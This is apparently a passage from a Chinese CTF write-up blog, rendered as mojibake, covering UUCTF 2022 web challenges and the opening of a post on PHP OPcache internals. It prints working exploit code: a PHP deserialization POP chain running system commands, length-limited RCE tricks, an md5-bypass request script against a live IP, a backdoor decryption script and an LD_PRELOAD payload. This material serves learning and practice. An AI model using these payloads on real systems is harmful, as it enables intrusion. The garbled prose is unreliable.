$data_replace=str_replace(\"hacker\",\"loveuu!\",$data); unserialize($data_replace); }else{ highlight_file(__FILE__); } ?&gt; è¿™é‡Œé“¾å­å¾ˆç®€å•ï¼Œä½†å°±æ˜¯$this-&gt;basedataè¿™é‡Œçš„å¤„ç†ï¼Œå¦‚æœå°è¯•ç›´æ¥åœ¨ä»£ç ä¸­æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ä¼šå‘ç°æ²¡æœ‰ç”¨ï¼Œå› æ­¤è¿™é‡Œå°±èƒ½æƒ³åˆ°å‡­å€Ÿå­—ç¬¦ä¸²é€ƒé€¸æ¥æ’å…¥basedataçš„payload æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸‹æœ€ç»ˆç†æƒ³çš„å­—ç¬¦ä¸²ï¼Œç”±äºè¿™é‡Œè¾“å…¥çš„å†…å®¹æœ€ç»ˆéƒ½ä¼šèµ‹å€¼ç»™nameï¼Œå› æ­¤éœ€è¦é€ƒé€¸ä¸€ä¸‹ï¼Œæˆ‘ä»¬å…ˆé—­åˆå‰é¢çš„nameå€¼ \";s:3:\"key\";s:5:\"UUCTF\";s:8:\"basedata\";s:'.strlen($basedata).':\"'.$basedata.'\";s:2:\"ob\";N;} ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸Šè¿°payloadçš„é•¿åº¦ï¼Œæ ¹æ®é•¿åº¦æ¥æ„å»ºhackerçš„ä¸ªæ•°ï¼Œpopå¦‚ä¸‹ &lt;?php class UUCTF{ public $name,$key,$basedata,$ob; } class output{ public $a; } class nothing{ public $a; public $b; public $t; } class youwant{ public $cmd; } $pop = new nothing(); $pop-&gt;a = &amp;$pop-&gt;b; $pop-&gt;t = new output(); $pop-&gt;t-&gt;a = new youwant(); $pop-&gt;t-&gt;a-&gt;cmd = \"system('tac flag.php');\"; $pop1 = base64_encode(serialize($pop)); $data = '\";s:3:\"key\";s:5:\"UUCTF\";s:8:\"basedata\";s:'.strlen($pop1).':\"'.$pop1.'\";s:2:\"ob\";N;}'; $payload = ''; $hacker = ''; for ($i = 0; $i &lt; strlen($data);$i++){ $hacker .= 'hacker'; } $payload = $hacker.$data; echo $payload; ?&gt; è¿™é‡Œä»–ä»¬è¯´catå›æ˜¾ä¸äº†ï¼Œæˆ‘å°±ç›´æ¥æ¢äº†ã€‚è¿™é‡ŒæˆåŠŸé€ƒé€¸ä¹‹åï¼Œåé¢çš„payloadå°±ä¸å†æ˜¯nameçš„å€¼äº†ï¼Œä¾¿ä¼šè¢«å•ç‹¬ååºåˆ—åŒ–å‡ºæ¥ã€‚ è¿™é“é¢˜å½“åˆä¸ä¼šä¹Ÿå°±æ˜¯å› ä¸ºæ²¡æƒ³é€šä¸ºä»€ä¹ˆè¦é€ƒé€¸å­—ç¬¦ä¸²ï¼Œå¯¹nameè¿™ä¸ªåœ°æ–¹æ²¡æœ‰æ€è€ƒã€‚ [UUCTF 2022 æ–°ç”Ÿèµ›]ezrce è¿™é“é¢˜ç¯å¢ƒå‡ºäº†ç‚¹é—®é¢˜ï¼Œä½†å¿½ç•¥å³å¯ã€‚æ ¹æ®æç¤ºè¿™é“é¢˜æ˜¯ä¸€é“æ— å›æ˜¾RCEï¼Œä¸”é™åˆ¶å‘½ä»¤æ‰§è¡Œé•¿åº¦å°äº7 è·Ÿç€æ–‡ç« å­¦å¦‚ä½•ç»•è¿‡é•¿åº¦é™åˆ¶å³å¯ï¼Œè¿™é‡Œä¹Ÿæ²¡æœ‰å¯¹å‘½ä»¤åšå‡ºé™åˆ¶ï¼Œå­¦ä¹ å‚è€ƒï¼šhttps://blog.csdn.net/jvkyvly/article/details/115259867 æ€»çš„æ¥è¯´å°±æ˜¯å‡­å€Ÿ&gt;ä¸&gt;&gt;ï¼šä¹Ÿå°±æ˜¯è¦†ç›–å’Œè¿½åŠ æ¥è¿›è¡Œç»•è¿‡ï¼Œæµ…æµ…ä¸¾ä¸ªä¾‹å­ï¼š æ¯”å¦‚é™åˆ¶äº†é•¿åº¦ä¸º7ï¼ˆç»å…¸çš„å°±æ˜¯7ã€5ã€4ï¼‰ï¼Œå‡è®¾æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤æ˜¯ï¼šcat /flagæ˜¾ç„¶è¶…è¿‡é•¿åº¦é™åˆ¶äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¿™æ ·æ„é€  &gt;g\\\\ &gt;a\\\\ &gt;l\\\\ &gt;f\\\\ &gt;/\\\\ &gt;\\ \\\\ &gt;e\\\\ &gt;r\\\\ &gt;o\\\\ &gt;m\\\\ ls -t&gt;0 å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå½“å†™å®Œä¸Šè¿°payloadï¼Œåˆ©ç”¨ls -té€‰é¡¹ï¼Œä½¿å¾—å½“å‰ç›®å½•æŒ‰ç…§æ—¶é—´é¡ºåºç”±æ—©åˆ°æ™šè¿›è¡Œæ’åˆ—ï¼Œéšååˆ©ç”¨sh æ‰§è¡Œæ–‡ä»¶0ï¼Œå…¶ä¸­çš„å†…å®¹ä¾¿ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œã€‚å…·ä½“åŸå› å¦‚ä¸‹ï¼š 1.linuxä¸­å¯ä»¥ç”¨\\ä½¿æŒ‡ä»¤è¿æ¥ä¸‹ä¸€è¡Œï¼Œè¿™æ ·å°±å¯ä»¥å†™å¤šè¡Œå‘½ä»¤äº†ã€‚ 2.æ–‡ä»¶ä¸­å‰é¢å‘½ä»¤å‡ºé”™ï¼Œä¼šè‡ªåŠ¨è·³è¿‡ï¼Œä¸å½±å“åé¢å‘½ä»¤çš„æ‰§è¡Œã€‚ 3.å¯ä»¥ç”¨sh,bash,source, .æ¥æ‰§è¡Œä¸€ä¸ªè„šæœ¬ã€‚ ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥ç”¨ sh 0 bash 0 ./0 . 0 æ¥æ‰§è¡Œ0è¿™ä¸ªè„šæœ¬ è€Œä¸Šè¿°æ„é€ payloadçš„æ—¶å€™ï¼Œå†™äº†ä¸¤æ¬¡\\\\ï¼Œæ˜¯ä¸ºäº†è½¬ä¹‰\\ï¼Œå¦åˆ™ä¼šè¢«å½“åšè¿æ¥ä¸‹ä¸€è¡Œæ¥æ‰§è¡Œï¼Œè€Œç©ºæ ¼åœ¨linuxä¸­ä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯å‘½ä»¤çš„åˆ†éš”ç¬¦ï¼Œå› æ­¤ä¹Ÿéœ€è¦\\è½¬ä¹‰ä¸€ä¸‹ è€Œæœ‰äº†ä¸Šè¿°çš„æ€è·¯ï¼Œè¿™é“é¢˜æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°é•¿åº¦é™åˆ¶ä¸ºå°äº7ï¼Œè€Œls -t&gt;0é•¿åº¦æ°å¥½ä¸º7ï¼Œæ˜¾ç„¶ä¸è¡Œï¼Œå› æ­¤å°±åº”è¯¥å…ˆæƒ³åŠæ³•æ„é€ ls -t&gt;0å³å¯ï¼Œä¸è¿‡é’ˆå¯¹è¿™é“é¢˜è¿˜å¯ä»¥æœ‰å…¶ä»–æ€è·¯ï¼ˆä¹Ÿæ˜¯çœ‹çš„wpï¼‰ ç›´æ¥å…ˆ&gt;nlåˆ›å»ºä¸€ä¸ªnlç›®å½•ï¼Œæ¥ç€è¾“å…¥* /*&gt;dï¼Œå‘½ä»¤è§£é‡Šå¦‚ä¸‹ 1.é€šé…ç¬¦*:ç›¸å½“äº$(dir *), 2.è¾“å…¥ç»Ÿé…ç¬¦* ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•° ä½†è¿™é‡Œæˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œè¾“å…¥*æ€»æ˜¯ä¼šæ˜¾ç¤ºå‘½ä»¤ä¸å­˜åœ¨ï¼Œä¹Ÿä¸æ¸…æ¥šä»€ä¹ˆæƒ…å†µ æœ€åæ‰§è¡Œå®Œä¹‹åï¼Œè®¿é—®/tmp/då³å¯å¾—åˆ°flag å‚è€ƒæ–‡ç«  2022UUCTF-web CTFé•¿åº¦é™åˆ¶å‘½ä»¤æ‰§è¡Œ [UUCTF 2022 æ–°ç”Ÿèµ›]phonecode è¯´å®è¯ï¼Œè¿™é¢˜çœ‹ä¸‹æ¥æ„Ÿè§‰æ˜¯éœ€è¦è„‘æ´çš„ï¼Œæ ¹æ®æ ‡ç­¾æç¤ºä»¥åŠé—®é¢˜æœç´¢ï¼Œæˆ‘æ¸…æ¥šè¿™é“é¢˜è€ƒç‚¹å°±æ˜¯éšæœºæ•°é¢„æµ‹ï¼Œä½†è¯¥ç«™ç‚¹çš„é€»è¾‘æˆ‘å¹¶æœªææ‡‚ï¼Œæˆ‘ä»¬å€ŸåŠ©wpåˆ†æå§ ä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ç»è¿‡æµ‹è¯•å‘ç°å¦‚ä¸‹ç°è±¡ï¼Œå½“é‡‡ç”¨æ•°å­—ä½œä¸ºéšæœºæ•°ç§å­æ—¶ï¼Œå¾—åˆ°çš„ç»“æœå§‹ç»ˆæ˜¯é‡å¤å”¯ä¸€çš„ï¼ˆä¸è®ºæ•°å­—é•¿åº¦å¤šå°‘ï¼‰ ä½†å½“é‡‡ç”¨å­—ç¬¦ä¸²ä½œä¸ºéšæœºæ•°ç§å­çš„æ—¶å€™ï¼Œå¾—åˆ°çš„ç»“æœæ€»æ˜¯å˜åŒ–çš„ï¼Œå…·ä½“è§£é‡ŠGPTç»™å‡ºå¦‚ä¸‹å›ç­”ï¼š å½“ä½ å°†å­—ç¬¦ä¸²ç”¨ä½œéšæœºæ•°ç”Ÿæˆå™¨çš„ seed æ—¶ï¼Œå³ä½¿ç”Ÿæˆçš„åºåˆ—çœ‹èµ·æ¥åƒæ˜¯éšæœºçš„ï¼Œä½†å®ƒä»ç„¶æ˜¯ deterministicï¼ˆç¡®å®šæ€§çš„ï¼‰ã€‚è¿™æ˜¯å› ä¸ºè™½ç„¶åœ¨å­—ç¬¦ä¸²å’Œæ•´æ•°ä¹‹é—´å­˜åœ¨æ˜ç¡®çš„è½¬æ¢è§„åˆ™ï¼Œä½†ç”±äºå­—ç¬¦ä¸²çš„å¯èƒ½å–å€¼èŒƒå›´è¦å¤§å¾—å¤šï¼Œå› æ­¤å¾ˆéš¾é¢„æµ‹å­—ç¬¦ä¸²åˆ°æ•´æ•°çš„è½¬æ¢ç»“æœï¼Œä»è€Œå¯¼è‡´ç”Ÿæˆçš„éšæœºæ•°åºåˆ—ä¹Ÿæ›´éš¾ä»¥é¢„æµ‹ã€‚ å…·ä½“è€Œè¨€ï¼Œå½“ä½ ä½¿ç”¨å­—ç¬¦ä¸²ä½œä¸º seed æ—¶ï¼ŒMT ç”Ÿæˆç®—æ³•é¦–å…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œå°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªå¤§å‹æ•´æ•°ã€‚è¿™ä¸ªè¿‡ç¨‹æ¶‰åŠå°†å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦æ˜ å°„åˆ°ä¸€ä¸ªå›ºå®šçš„å¤§ç´ æ•°ä¸Šï¼Œç„¶åå°†è¿™äº›æ•°ç›¸ä¹˜å’ŒæŠ˜å ä»¥å½¢æˆæœ€ç»ˆçš„å¤§æ•´æ•°ã€‚è¿™ä¸ªè¿‡ç¨‹éå¸¸å¤æ‚ï¼Œå› æ­¤å¾ˆéš¾ç›´æ¥é¢„æµ‹å­—ç¬¦ä¸²åˆ°æ•´æ•°çš„è½¬æ¢å…³ç³»ã€‚ è™½ç„¶åœ¨æŸäº›æƒ…å†µä¸‹ä»ç„¶å¯èƒ½å‡ºç°æŸäº› seed patterns å¯¼è‡´ç±»ä¼¼çš„åºåˆ—ï¼Œä½†ç”±äºå­—ç¬¦ä¸²çš„å¯èƒ½å–å€¼èŒƒå›´å¹¿æ³›ä¸”å¤æ‚ï¼Œå› æ­¤åœ¨å®è·µä¸­å¾ˆå°‘é‡åˆ°è¿™ç§é—®é¢˜ã€‚ æ€»ä¹‹ï¼Œä½¿ç”¨å­—ç¬¦ä¸²ä½œä¸º seed å¯ä»¥è®©äººæ„Ÿè§‰ç”Ÿæˆçš„éšæœºæ•°åºåˆ—æ›´åŠ éšæœºï¼Œä½†å®é™…ä¸Šå®ƒä»ç„¶æ˜¯ç¡®å®šæ€§çš„ã€‚å»ºè®®è¿˜æ˜¯ä½¿ç”¨æ—  pattern çš„ seedï¼Œæ¯”å¦‚ time-based values ä»¥è·å¾—æ›´å¥½çš„ä¼ªéšæœºæ€§ã€‚ æ¥ä¸‹æ¥åˆ†æé€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šè¿°çš„httpåŒ…ä¸­ï¼Œpostä¼ çš„å‚å«æœ‰phoneä¸codeå‚æ•°ï¼Œç»™å‡ºçš„å“åº”ç»“æœæ˜¯ä¸€ä¸ªhint:æ•°å­—ï¼Œæ˜¾ç„¶hintå°±æ˜¯æ¥æç¤ºæˆ‘ä»¬çš„ ç»“åˆé¢˜ç›®ä¿¡æ¯ï¼šä½ èƒ½çŒœåˆ°éªŒè¯ç å—ï¼Ÿ å¯ä»¥çŒœåˆ°ï¼Œphoneå¤§æ¦‚ç‡æ˜¯ä½œä¸ºäº†éšæœºæ•°ç§å­ï¼Œè€Œcodeåº”è¯¥å°±æ˜¯è¯¥éšæœºæ•°ç§å­ç»è¿‡mt_randå‡½æ•°å¾—åˆ°çš„ç»“æœï¼ˆä½†ä¸æ¸…æ¥šæ˜¯ç¬¬å‡ ä¸ªï¼‰ é‚£æ€è·¯æ˜ç¡®äº†ï¼Œæˆ‘ä»¬è®¾ç½®éšæœºæ•°ç§å­ï¼ˆä¹Ÿå°±æ˜¯phoneï¼‰ï¼ŒçŒœè§£ä¸€ä¸‹codeä¼šæ˜¯è¯¥ç§å­äº§ç”Ÿçš„ä¼ªéšæœºæ•°çš„ç¬¬å‡ ä¸ªå³å¯ &lt;?php mt_srand(1); echo mt_rand(); echo \" \"; echo mt_rand(); echo \" \"; echo mt_rand(); echo \" \"; ?&gt; è¾“å‡º 895547922 2141438069 1546885062 è¿™é‡Œå°è¯•äº†ç¬¬äºŒä¸ªéšæœºæ•°ï¼ŒæˆåŠŸçŒœè§£ ä¸è¿‡å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨å¾—åˆ°éšæœºæ•°ç»“æœçš„æ—¶å€™ï¼Œå¹¶ä¸æ¸…æ¥šPHPç‰ˆæœ¬ï¼Œè€Œç‰ˆæœ¬ä¸åŒï¼Œç”Ÿæˆçš„ç»“æœä¹Ÿå°±ä¸åŒï¼Œè¿™æ—¶å€™å°±éœ€è¦åˆ©ç”¨å·¥å…·æ¥çŒœè§£ä¸€ä¸‹å½“å‰PHPç‰ˆæœ¬ã€‚å¦‚ä¸Šå›¾ï¼Œçˆ†ç ´å‡ºä¸€ä¸ªseed=1ï¼Œå¯¹åº”çš„ç‰ˆæœ¬æ˜¯php7.1ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åœ¨è‡ªå·±æµ‹è¯•çš„æ—¶å€™ï¼Œä¹Ÿéœ€è¦ä¸å…¶çš„ç‰ˆæœ¬åŒ¹é…æ‰å¯ä»¥ã€‚ å‚è€ƒæ–‡ç«  ä¼ªéšæœºæ•°é—®é¢˜æ€»ç»“ PHPä¼ªéšæœºæ•° UUCTF WP [UUCTF 2022 æ–°ç”Ÿèµ›]funmd5 &lt;?php error_reporting(0); include \"flag.php\"; $time=time(); $guessmd5=md5($time); $md5=$_GET[\"md5\"]; if(isset($md5)){ $sub=substr($time,-1); $md5=preg_replace('/^(.*)0e(.*)$/','${1}no_science_notation!${2}',$md5); if(preg_match('/0e/',$md5[0])){ $md5[0]=substr($md5[0],$sub); if($md5[0]==md5($md5[0])&amp;&amp;$md5[1]===$guessmd5){ echo \"well!you win again!now flag is yours.&lt;br&gt;\"; echo $flag; } else{ echo $md5[0]; echo \"oh!no!maybe you need learn more PHP!\"; } } else{ echo \"this is your md5:$md5[0]&lt;br&gt;\"; echo \"maybe you need more think think!\"; } } else{ highlight_file(__FILE__); $sub=strlen($md5[0]); echo substr($guessmd5,0,5).\"&lt;br&gt;\"; echo \"plase give me the md5!\"; } ?&gt; 07d68 plase give me the md5! å…³é”®ç‚¹åœ¨äºç»•è¿‡preg_replaceï¼Œé¦–å…ˆpreg_replaceè·å–æ•è·ä¸¤ä¸ªå…ƒç»„ï¼Œæ¥ç€å¯¹ç¬¬ä¸€ä¸ªå…ƒç»„è¿›è¡Œsubstrçš„æˆªå–ï¼Œéšåè¿›å…¥åˆ¤æ–­ï¼Œåªæœ‰å½“ç¬¬ä¸€ä¸ªå…ƒç»„çš„å€¼ä¸å…¶è‡ªèº«ç»è¿‡md5åŠ å¯†çš„å€¼ç›¸ç­‰ï¼Œä¸”ç¬¬äºŒä¸ªå…ƒç»„ç­‰äºå½“å‰æ—¶é—´æˆ³ç»è¿‡md5åŠ å¯†ä¹‹åçš„å€¼ï¼Œæ‰èƒ½å¾—åˆ°flagã€‚ æˆ‘ä»¬ç›´æ¥ä¼ å…¥ md5[0]=%0a0e215962017&amp;md5[1]=md5(æ—¶é—´æˆ³) %0aå¯ä»¥ç»•è¿‡preg_replaceï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰é™åˆ¶æ˜¯å¦è¯†åˆ«æ¢è¡Œï¼Œæˆ‘ä»¬æ¢è¡Œå³å¯ï¼Œä¹‹åè¿›å…¥ifè¯­å¥ï¼Œåªè¦è€å¿ƒç­‰å¾…å½“å‰æ—¶é—´æˆ³çš„æœ€åä¸€ä½æ˜¯1å³å¯ã€‚ å› ä¸ºåªæœ‰å½“æœ€åä¸€ä½æ˜¯1çš„æ—¶å€™$md5[0]=substr($md5[0],1);æ‰ä¼šä»%0aè¿™ç¬¬ä¸€ä¸ªå­—ç¬¦åé¢å¼€å§‹æˆªå–ï¼ˆæˆªå–å®Œæ•´å­—ç¬¦ä¸²ï¼Œé™¤äº†æ¢è¡Œç¬¦ï¼‰ import requests import time as time import hashlib def send(): url = \"http://1.14.71.254:28204/\" data = \"md5[0]=%0a0e215962017&amp;md5[1]={}\".format( str(hashlib.md5(str(int(time.time())).encode(\"utf-8\")).hexdigest())) urltext = requests.get(url, data) print(urltext.text) if \"NSSCTF\" in urltext.text: print(urltext.text) exit() def timeguess(): time.sleep(0.5) print(int(time.time())) for i in range(100): timeguess() send() å‚è€ƒæ–‡ç«  [UUCTF 2022 æ–°ç”Ÿèµ›]funmd5 UUCTF(å…¬å…±èµ›é“) 2022UUCTF-web [UUCTF 2022 æ–°ç”Ÿèµ›]backdoor ä¸€çœ¼ä¸ä¼šï¼Œæ‰«ç›®å½•å‘ç°www.zipã€robots.txtï¼Œhintï¼šbackdoor.phpæ˜¯åé—¨æ–‡ä»¶ å¤§æ¦‚çŒœåˆ°å°±æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œä½†è¢«åŠ å¯†äº†ï¼Œå’±éœ€è¦è§£å¯†ï¼Œæ ¹æ®wpç”¨idaæ‰“å¼€soæ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰¾åˆ°äº†tonyenc_decodeå‡½æ•°ï¼Œå®šä½ä¸€ä¸‹å‘ç°çœ‹ä¸æ‡‚ï¼Œä¸Šç™¾åº¦æœæœ æ‰¾åˆ°é¡¹ç›®åœ°å€ï¼šhttps://github.com/lihancong/tonyenc çœ‹ä¸€ä¸‹åŠ å¯†è¿‡ç¨‹ï¼Œä¸‹å›¾è¿™é‡Œå°±æ˜¯åŠ å¯†çš„ç‰¹å¾å¤´ä»¥åŠåŠ å¯†ç§˜é’¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨idaé‡Œé¢æ‰¾åˆ° å…¨å±€æœç´¢ä¸€ä¸‹ï¼Œå‘ç°å¯¹åº”çš„key header=[0x66, 0x88, 0xff, 0x4f,0x68, 0x86, 0x00, 0x56,0x11, 0x61, 0x16, 0x18] key[]=[0x9f,0x58,0x54,0x00,0x58,0x9f,0xff,0x23,0x8e,0xfe,0xea,0xfa,0xa6,0x35,0xf3,0xc6] æ ¹æ®githubæºç å†™è§£å¯†pyè„šæœ¬:https://github.com/lihancong/tonyenc/blob/master/core.h ç½‘ä¸Šè„šæœ¬å°±æ‰¾åˆ°è¿™ä¸ªï¼Œä½†è§£ä¸å‡ºæ¥ï¼Œä¼°è®¡æŸäº›åœ°æ–¹æ”¹äº†ï¼Œè¿™é‡Œæˆ‘ä¸ç†è§£æœ€åçš„data[i]&lt;0ä¹‹åçš„å«ä¹‰ import base64 header=[ 0x66, 0x88, 0xff, 0x4f, 0x68, 0x86, 0x00, 0x56, 0x11, 0x61, 0x16, 0x18, ] key=[ 0x9f, 0x58, 0x54, 0x00, 0x58, 0x9f, 0xff, 0x23, 0x8e, 0xfe, 0xea, 0xfa, 0xa6, 0x35, 0xf3, 0xc6] def decode(data,len): p =0 for i in range(0,len): if (i &amp; 1): p += key[p] + i; p %= 16; t = key[p]; data[i] = ~data[i]^t; if data[i] &lt; 0: data[i]=data[i]+256 decode = \"\".join([chr(c) for c in data]) return decode encodefile=open('backdoor.php',\"rb\") base64_encodestr=base64.b64encode(encodefile.read()) convert=[c for c in base64.b64decode(base64_encodestr)] del convert[0:len(header)] print(str(decode(convert,len(convert)))) å‚è€ƒæ–‡ç«  2022UUCTF-web [UUCTF 2022 æ–°ç”Ÿèµ›]uploadandinject æŸ¥çœ‹hint.phpï¼Œæ ¹æ®æç¤ºè®¿é—®.index.php.swpï¼Œlinuxä¸‹ vi -r æ–‡ä»¶åæ¢å¤ $PATH=$_GET[\"image_path\"]; if((!isset($PATH))){ $PATH=\"upload/1.jpg\"; } echo \"&lt;div align='center'&gt;\"; loadimg($PATH); echo \"&lt;/div&gt;\"; function loadimg($img_path){ if(file_exists($img_path)){ //è®¾ç½®ç¯å¢ƒå˜é‡çš„å€¼æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ è®¾ç½®.so LD_PRELOADè®¾ç½®çš„ä¼˜å…ˆåŠ è½½åŠ¨æ€é“¾æ¥åº“ putenv(\"LD_PRELOAD=/var/www/html/$img_path\"); system(\"echo Success to load\"); echo \"&lt;br&gt;&lt;img src=$img_path&gt;\"; }else{ system(\"echo Failed to load \"); } } #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void payload() { //åå¼¹shell system(\"cat /f*\"); } char *strcpy (char *__restrict __dest, const char *__restrict __src) { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } å‚è€ƒæ–‡ç«  2022UUCTF-web","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"PHP-OPcacheGetshellå­¦ä¹ ","path":"/2024/04/09/php-opcachegetshell/","content":"0x01 ç®€ä»‹ PHPé¡¹ç›®ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨é«˜å¹¶å‘å¤§æµé‡çš„åœºæ™¯ä¸­ï¼Œå¦‚ä½•æå‡PHPçš„å“åº”æ—¶é—´ï¼Œæ˜¯ä¸€é¡¹ååˆ†é‡è¦çš„å·¥ä½œã€‚è€ŒOpcacheåˆæ˜¯ä¼˜åŒ–PHPæ€§èƒ½ä¸å¯ç¼ºå¤±çš„ç»„ä»¶ï¼Œå°¤å…¶æ˜¯åº”ç”¨äº†PHPæ¡†æ¶çš„é¡¹ç›®ä¸­ï¼Œä½œç”¨æ›´æ˜¯æ˜æ˜¾ã€‚ åœ¨ç†è§£ OPCache åŠŸèƒ½ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å…ˆç†è§£PHP-FPM + Nginx çš„å·¥ä½œæœºåˆ¶ï¼Œä»¥åŠPHPè„šæœ¬è§£é‡Šæ‰§è¡Œçš„æœºåˆ¶ã€‚ PHP-FPM + Nginx çš„å·¥ä½œæœºåˆ¶ è¯·æ±‚ä»webæµè§ˆå™¨åˆ°NGINXï¼Œå†åˆ°PHPå¤„ç†å®Œæˆï¼Œä¸€å…±éœ€è¦äº”ä¸ªæ­¥éª¤ï¼š ç¬¬ä¸€æ­¥ï¼šå¯åŠ¨æœåŠ¡ å¯åŠ¨PHP-FPMã€‚è¿™ä¸ªæœåŠ¡æ”¯æŒä¸¤ç§é€šä¿¡æ¨¡å¼ï¼šTCP socketä¸Unix socket PHP-FPMä¼šå¯åŠ¨ä¸¤ç§ç±»å‹çš„è¿›ç¨‹ï¼šmasterè¿›ç¨‹å’Œworkerè¿›ç¨‹ã€‚å‰è€…ç”¨äºç›‘å¬ç«¯å£ã€åˆ†é…ä»»åŠ¡ã€ç®¡ç†workerè¿›ç¨‹ï¼›åè€…å°±æ˜¯PHPçš„CGIç¨‹åºï¼Œè´Ÿè´£ç¼–è¯‘æ‰§è¡ŒPHPè„šæœ¬ã€‚ å¯åŠ¨NGINXã€‚é¦–å…ˆä¼šåŠ è½½nginx_http_fastcgi_module æ¨¡å—ï¼Œåˆå§‹åŒ–FastCGIæ‰§è¡Œç¯å¢ƒï¼Œå®ç°FastCGIåè®®è¯·æ±‚ä»£ç†ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šFastCGIçš„workerè¿›ç¨‹ï¼ˆCGIè¿›ç¨‹ï¼‰ï¼Œæ˜¯ç”±PHP-FPMç®¡ç†ï¼Œä¸æ˜¯NGINXï¼ŒNGINXåªæ˜¯èµ·ä»£ç†çš„ä½œç”¨ ç¬¬äºŒæ­¥ï¼šrequest=ã€‹NGINX NGINXæ¥å—åˆ°è¯·æ±‚ï¼Œå¹¶åŸºäºlocationé…ç½®ï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„handlerï¼ˆç®—æ˜¯ç›‘å¬å™¨å§ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯ä»£ç†PHPçš„handler ç¬¬ä¸‰æ­¥ï¼šNGINX=ã€‹PHP-FPM NGINXæŠŠè¯·æ±‚ç¿»è¯‘ä¸ºFastCGIè¯·æ±‚ï¼Œé€šè¿‡tcp socket/unix socketå‘é€ç»™PHP-FPMçš„masterè¿›ç¨‹ ç¬¬å››æ­¥ï¼šPHP-FPM master=ã€‹worker PHP-FPM masterè¿›ç¨‹æ¥æ”¶åˆ°è¯·æ±‚ï¼Œåˆ†é…masterè¿›ç¨‹æ‰§è¡ŒPHPè„šæœ¬ï¼Œå¦‚æœæ²¡æœ‰ç©ºé—²çš„workerï¼Œè¿”å›502 workerå¦‚æœæ‰§è¡Œè¶…æ—¶ï¼Œè¿”å›504é”™è¯¯ï¼›å¤„ç†ç»“æŸï¼Œè¿”å›ç»“æœ ç¬¬äº”æ­¥ï¼šworker=ã€‹master=ã€‹NGINX PHP-FPM Worker è¿›ç¨‹è¿”å›å¤„ç†ç»“æœï¼Œå¹¶å…³é—­è¿æ¥ï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªè¯·æ±‚ PHP-FPM Master è¿›ç¨‹é€šè¿‡Socket è¿”å›å¤„ç†ç»“æœ Nginx Handleré¡ºåºå°†æ¯ä¸€ä¸ªå“åº”bufferå‘é€ç»™ç¬¬ä¸€ä¸ªfilter â†’ ç¬¬äºŒä¸ª â†’ ä»¥æ­¤ç±»æ¨ â†’ æœ€ç»ˆå“åº”å‘é€ç»™å®¢æˆ·ç«¯ PHPè„šæœ¬è§£é‡Šæ‰§è¡Œçš„æœºåˆ¶ äº†è§£äº†PHP + Nginx æ•´ä½“çš„å¤„ç†æµç¨‹åï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹PHPè„šæœ¬å…·ä½“æ‰§è¡Œæµç¨‹ï¼Œé¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸ªå®ä¾‹ï¼š &lt;?php if (!empty($_POST)) { echo \"Response Body POST: \", json_encode($_POST), \" \"; } if (!empty($_GET)) { echo \"Response Body GET: \", json_encode($_GET), \" \"; } æˆ‘ä»¬åˆ†æä¸€ä¸‹æ‰§è¡Œè¿‡ç¨‹ï¼š phpåˆå§‹åŒ–æ‰§è¡Œç¯èŠ‚ï¼Œå¯åŠ¨Zendå¼•æ“ï¼ŒåŠ è½½æ³¨å†Œçš„æ‰©å±•æ¨¡å— åˆå§‹åŒ–åè¯»å–è„šæœ¬æ–‡ä»¶ï¼ŒZendå¼•æ“å¯¹è„šæœ¬æ–‡ä»¶è¿›è¡Œè¯æ³•åˆ†æ(lex)ï¼Œè¯­æ³•åˆ†æ(bison)ï¼Œç”Ÿæˆè¯­æ³•æ ‘ Zend å¼•æ“ç¼–è¯‘è¯­æ³•æ ‘ï¼Œç”Ÿæˆopcodeï¼Œ Zend å¼•æ“æ‰§è¡Œopcodeï¼Œè¿”å›æ‰§è¡Œç»“æœ åœ¨PHP 